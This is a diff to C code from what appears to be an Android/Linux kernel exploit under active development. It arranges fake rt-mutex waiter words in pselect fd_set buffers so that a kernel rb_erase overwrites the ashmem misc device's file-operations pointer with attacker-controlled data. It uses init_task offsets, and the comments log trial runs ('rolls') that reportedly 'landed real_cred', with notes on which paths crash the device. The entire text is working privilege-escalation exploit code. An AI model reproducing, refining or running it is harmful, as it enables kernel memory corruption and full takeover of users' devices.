@@ -364,6 +364,25 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
             (active_offsets ? active_offsets->off_init_task
                             : (uint64_t)INIT_TASK_OFF) + 0x878ULL);
       }
+      /*
+       * MODE4_JC2_PI=1 (roll 10): carry the swap on the GHOST's OWN pi
+       * words — at shift=0 words 3/4/5 are fully stampable. The ghost's
+       * dequeue_pi runs rb_erase Case 2-left on {pc=fake_fops(page),
+       * right=0, left=&misc.fops}: store-1 lands *(misc.fops)=fake_fops
+       * (the form that landed real_cred repeatedly), change_child writes
+       * into our page, rebalance NULL. Tree stays {0,0,0} (roll-7-proven
+       * harmless root case). NO W0 processing (rolls 8-9 showed the W0
+       * path is the lethal stage).
+       */
+      uint64_t g_pi_parent = 0, g_pi_left = 0;
+      if (env_flag("MODE4_JC2_PI", 0)) {
+        uint64_t misc_off =
+            (active_offsets && active_offsets->off_ashmem_misc_fops)
+                ? (uint64_t)active_offsets->off_ashmem_misc_fops
+                : (uint64_t)ASHMEM_MISC_FOPS_OFF;
+        g_pi_parent = (uint64_t)fake_fops;
+        g_pi_left = (uint64_t)data_addr(KIMAGE_TEXT_BASE + misc_off);
+      }
       struct pselect_waiter_word jc2_words[] = {
           /* F9360 (SAME KMI) target.h: "5.10: waiter qword 0 overlaps the
            * first fd-set qword" — at shift=0 ALL TEN words are stampable.
@@ -371,15 +390,10 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
            * words 0/1 are NEVER left to the original linkage again. */
           {0, 0, "tree_pc"},
           {1, 0, "tree_right"},
-          /* root-case erase writes tree_left into fake_lock->waiters root —
-           * set it to W0 itself: the store re-writes the value already
-           * there (no-op) so W0 stays top-waiter and the W0.pi erase
-           * delivers the write. Zeroing it (roll 7) nulled the root and
-           * the proof missed with the device ALIVE. */
-          {2, (uint64_t)fake_w0, "tree_left"},
-          {3, 0, "pi_parent"},
+          {2, 0, "tree_left"},
+          {3, g_pi_parent, "pi_parent"},
           {4, 0, "pi_right"},
-          {5, 0, "pi_left"},
+          {5, g_pi_left, "pi_left"},
           {6, (uint64_t)init_task, "task"},
           {7, ghost_lock, "lock"},
           {8, ghost_prio, "prio"},
